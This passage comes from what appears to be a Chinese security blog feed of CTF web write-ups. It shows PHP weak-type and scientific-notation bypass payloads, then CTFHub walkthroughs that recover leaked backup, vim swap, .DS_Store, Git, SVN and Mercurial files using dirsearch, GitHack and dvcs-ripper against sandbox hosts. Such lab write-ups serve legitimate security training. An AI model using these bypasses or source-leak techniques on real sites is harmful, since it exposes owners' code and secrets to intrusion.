class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;message&#x27;</span>]);<br>    <span class="hljs-variable">$key</span> =<span class="hljs-string">&quot;*********&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$message</span>-&gt;key == <span class="hljs-variable">$key</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;~~~~&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输入一个数组进行json解码，解码后的message与key值相同才会得到flag，使用弱类型进行绕过，key肯定是字符串，两个等号时会转化成同一类型再进行比较，直接构造一个0就可以相等了，通过0==”admin”这种形式绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: message=&#123;<span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-number">0</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="15-科学计数法绕过"><a href="#15-科学计数法绕过" class="headerlink" title="15.科学计数法绕过"></a>15.科学计数法绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login&quot;</span>]))  <br>&#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yingzi&#x27;</span>]))<br>  &#123;<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;[a-zA-Z0-9]&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yingzi&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)<br>    &#123;<br>      <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&lt;script&gt;alert(&quot;give you flag)&quot;)&lt;/script&gt;&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">elseif</span> (strlen(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yingzi&#x27;</span>]) &lt; <span class="hljs-number">10</span> &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yingzi&#x27;</span>] &gt; <span class="hljs-number">987654321</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yingzi&#x27;</span>], <span class="hljs-string">&#x27;#BIG#&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)<br>      &#123;<br>        <span class="hljs-keyword">if</span> (!is_array(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yingzi&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./flag.php&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Congratulations! FLAG is : &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#x27;</span>);<br>      &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#x27;</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#x27;</span>);<br>    &#125;<br>  &#125;<br>&#125;<br>show_source(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>代码审计：</p><p>1.isset函数，POST传入参数login和yingzi。<br>2.strlen函数，参数yingzi的值长度小于10，且数值大于987654321。<br>3.strpos函数，参数yingzi的值是否匹配<code>#BIG#</code>，如果有，则包含一个flag.php文件，输出flag。</p><p>使用科学计数法绕过strlen函数，令yingzi=e9，此时strlen=3，为了匹配<code>#BIG#</code>，所以yingzi=1e9#BIG#</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: login=<span class="hljs-number">1</span>&amp;yingzi=<span class="hljs-number">1e9</span><span class="hljs-comment">#BIG#</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210201120107109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFHub-Web-信息泄露练习</title>
    <link href="/2020/10/24/CTFHub-Web-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%BB%83%E4%B9%A0/"/>
    <url>/2020/10/24/CTFHub-Web-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>摘要：CTFHub靶场通关（一）</p> <a id="more"></a><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p>访问网址，点击绿色按钮<br><img src="https://img-blog.csdnimg.cn/20201025170908376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>然后出现这样的页面<br><img src="https://img-blog.csdnimg.cn/20201025170931536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>点进去发现都有四个子文件，既然题目是目录遍历，那我就一个个点进去看，最后在4/4目录下发现了flag.txt<br><img src="https://img-blog.csdnimg.cn/20201025171354476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>打开获得flag<br><img src="https://img-blog.csdnimg.cn/20201025171411952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><p>访问网址，点击绿色按钮<br><img src="https://img-blog.csdnimg.cn/20201024125404176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>发现是phpinfo.php<img src="https://img-blog.csdnimg.cn/20201024125428811.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>按ctrl+F搜索flag<br><img src="https://img-blog.csdnimg.cn/20201024125524903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h2><h3 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h3><p>访问网址<br><img src="https://img-blog.csdnimg.cn/20201025171840554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>使用 dirsearch扫描，发现了可疑文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">py dirsearch.py -u http://challenge-4f306ca5f548ac6b.sandbox.ctfhub.com:<span class="hljs-number">10080</span>/ -e*<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201025172527172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>访问该文件，自动下载了一个压缩包，解压看到flag文档，结果。。。。。。<br><img src="https://img-blog.csdnimg.cn/20201025172829492.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>直接在浏览器上访问flag文档<br><img src="https://img-blog.csdnimg.cn/20201025173027426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h3><p><img src="https://img-blog.csdnimg.cn/20201025173722285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>一般备份文件的格式后缀为<code>.bak</code>，因此访问<code>url+/index.php.bak</code>，会自动下载一个文件，打开该文件，即可得到flag<br><img src="https://img-blog.csdnimg.cn/20201025173839200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br> <em>常见备份文件的后缀</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">.rar<br>.<span class="hljs-built_in">zip</span><br><span class="hljs-number">.7</span>z<br>.tar.gz<br>.bak<br>.swp<br>.txt<br>.html<br>linux中可能以<span class="hljs-string">&quot; ~ &quot;</span> 结尾<br></code></pre></td></tr></table></figure><h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><p>题目描述：当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。<br><img src="https://img-blog.csdnimg.cn/20201025175348418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>百度了解一下什么是 <code>vim缓存</code></p><blockquote><p>vim在编辑文档的过程中如果异常退出，会产生缓存文件，第一次产生的缓存文件后缀为.swp，后面会产生swo等.<br>网页后面输入.index.php.swp才能获取到index.php的备份文件</p></blockquote><p>访问<code>url/+.index.php.swp</code>下载文件，用记事本打开，在文档底部找到flag<br><img src="https://img-blog.csdnimg.cn/20201025175508624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h3><p>题目描述：<br>DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p><p>访问题目地址<br><img src="https://img-blog.csdnimg.cn/20201118202642955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>直接访问<code>.DS_Store</code>文件，自动下载文件，在kali中使用命令<code>cat DS_Store</code><br><img src="https://img-blog.csdnimg.cn/20201118203036832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>访问d18ec35f05a6922cc5c842f7b6706243.txt文件<br><img src="https://img-blog.csdnimg.cn/20201118203317871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h2><p><strong>安装 Git</strong></p><p>1 .点击Git-2.18.0-32-bit.exe进行安装，选择安装路径。<br><img src="https://img-blog.csdnimg.cn/20201024183656934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_c3doYXQ=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>2 . 点击“Next”按钮<br><img src="https://img-blog.csdnimg.cn/20201024183722145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3 .Next，在启动文件夹页面中，默认即可。<br><img src="https://img-blog.csdnimg.cn/20201024183744151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4 .Next，在为 Git 选择默认编辑器的页面中，可以选择一个在 Windows系统中使用较为方便的编辑器。</p><p>5 .Next，在将 Git 添加到环境变量的页面中，选择第二项。可以将 Git 自动添加到环境变量，可以方便地使用 Windows 控制台执行 Git 相关的命令。<br><img src="https://img-blog.csdnimg.cn/20201024183816454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>6 .后面的页面一路next，就可以完成 Git的安装。</p><p><strong>初始化 Git</strong></p><blockquote><p>注意：在配置 Git 用户名和邮箱时，推荐使用在 CodeCode 注册的用户名和邮箱。</p></blockquote><p>1  . 在 Git 中配置 CodeCode 用户名。<br>打开cmd，输入命令。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">git config --global user.name <span class="hljs-string">&#x27;xxx&#x27;</span><br></code></pre></td></tr></table></figure><p>2 . 在 Git 中配置邮箱。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">git config --global user.email <span class="hljs-string">&#x27;xxx@qq.com&#x27;</span><br></code></pre></td></tr></table></figure><p>3 . 查看已配置的用户信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">git config --<span class="hljs-keyword">global</span> --<span class="hljs-built_in">list</span><br></code></pre></td></tr></table></figure><h3 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h3><p> 使用githack工具处理git泄露情况，打开cmd窗口，进入githack目录下，然后执行</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">python2 Githack.py http:<span class="hljs-comment">//challenge-097036b10ed011a0.sandbox.ctfhub.com:10080/.git/</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201024204243631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>还原后的文件在 <code>dist</code> 目录下<br><img src="https://img-blog.csdnimg.cn/20201024204611326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>应该有隐藏文件夹，鼠标右键打开git命令窗口，执行<code>ls  -a</code>，发现了隐藏文件夹<code>.git</code><br><img src="https://img-blog.csdnimg.cn/20201024204803631.png#pic_center" alt="在这里插入图片描述"><br>然后<code> cd .git</code>进入.git目录,再执行<code>ls -a</code>，发现了<code>..文件</code><br><img src="https://img-blog.csdnimg.cn/2020102420502298.png#pic_center" alt="在这里插入图片描述"><br>执行<code>cd ..</code>，然后使用<code>git log</code>命令查看历史记录。最新版本 为remove flag，flag 在 add flag中<br> <img src="https://img-blog.csdnimg.cn/20201024205433523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>进行比对，得到flag</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">git diff <span class="hljs-number">602e0165129</span>c86054756c8a1b188265377b1d334<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201024205703823.png#pic_center" alt="在这里插入图片描述"></p><h3 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h3><p>打开cmd窗口，进入githack目录下，然后执行</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">python2 GitHack.py http:<span class="hljs-comment">//challenge-5dbefbea477f1e4f.sandbox.ctfhub.com:10080/.git/</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201024234829723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>进入生成的文件夹路径后，输入： <code>git stash list</code><br><img src="https://img-blog.csdnimg.cn/2020102423493374.png#pic_center" alt="在这里插入图片描述"><br>输入 <code>git stash apply</code> 进行恢复，发现了一个文档<br><img src="https://img-blog.csdnimg.cn/20201024235041194.png#pic_center" alt="在这里插入图片描述"><br>在路径下找到文档，得到flag<br><img src="https://img-blog.csdnimg.cn/20201024235153602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h3><p>方法一：<br>和前面两题一样的操作，进入githack目录下，然后执行<code>python2 GitHack.py http://challengefbe1da739791a37e.sandbox.ctfhub.com:10080/.git/</code><br><img src="https://img-blog.csdnimg.cn/20201025122844915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>cd到生成的文件夹目录下，执行<code>git ls-files</code>命令，可以看到一个文档<br><img src="https://img-blog.csdnimg.cn/20201025122827978.png#pic_center" alt="在这里插入图片描述"><br>flag就在文档中<br><img src="https://img-blog.csdnimg.cn/20201025123137677.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>方法二：<br>kali中使用GitHacker，执行命令安装GitHacker</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">clone git clone https:<span class="hljs-comment">//github.com/WangYihang/GitHacker</span><br></code></pre></td></tr></table></figure><p>进入GitHacker目录下，执行命令</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">python3 GitHacker.py http:<span class="hljs-comment">//challenge-78aecaffb772da05.sandbox.ctfhub.com:10080/.git</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201024231829893.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>再GitHacker目录下会生成两个个文件夹，打开<br><img src="https://img-blog.csdnimg.cn/20201024232158129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>flag就在记事本中<br><img src="https://img-blog.csdnimg.cn/20201024232234408.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h2><p>题目描述：当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。<br><img src="https://img-blog.csdnimg.cn/2020111820454290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>需要用到<code>dvcs-ripper</code>这个工具</p><p>安装dvcs-ripper</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">git clone https://github.com/kost/dvcs-ripper.git<br></code></pre></td></tr></table></figure><p>安装依赖包</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl<br></code></pre></td></tr></table></figure><p>安装失败，先执行下面的命令，再重新执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">apt<span class="hljs-operator">-</span><span class="hljs-keyword">get</span> <span class="hljs-keyword">update</span>  <br></code></pre></td></tr></table></figure><p>dvcs-ripper工具用法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">./rip-git.pl -v -u http://challenge-bd3813f36ed0e21c.sandbox.ctfhub.com:<span class="hljs-number">10080</span>/.svn/<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127175105515.png" alt="在这里插入图片描述"><br>查看目录结构</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">ls <span class="hljs-operator">-</span>al<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127175222664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进入.svn/pristine/目录，查看文件信息，看到可疑文件84<br><img src="https://img-blog.csdnimg.cn/20210127175318256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进入84文件，查看文件里面的内容即可得到flag<br><img src="https://img-blog.csdnimg.cn/20210127175403327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h2><p>题目描述:当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p><p>使用<code>dvcs-ripper</code>工具</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">.<span class="hljs-operator">/</span>rip<span class="hljs-operator">-</span>hg.pl <span class="hljs-operator">-</span>v <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>challenge<span class="hljs-number">-05407</span>d8a0c1ffb04.sandbox.ctfhub.com:<span class="hljs-number">10080</span><span class="hljs-operator">/</span>.hg<span class="hljs-operator">/</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127175822781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进入.hg/store/目录，查看文件信息<br><img src="https://img-blog.csdnimg.cn/20210127180159395.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看fncache文件信息<br><img src="https://img-blog.csdnimg.cn/20210127180229796.png" alt="在这里插入图片描述"><br>未看到flag_1711932515.txt信息<br><img src="https://img-blog.csdnimg.cn/20210127180244399.png" alt="在这里插入图片描述"><br>直接浏览器访问flag_1711932515.txt，即可得到flag<br><img src="https://img-blog.csdnimg.cn/20210127180402891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTFhub</tag>
      
      <tag>信息泄露</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浅谈PHP反序列化漏洞</title>
    <link href="/2020/10/18/%E6%B5%85%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
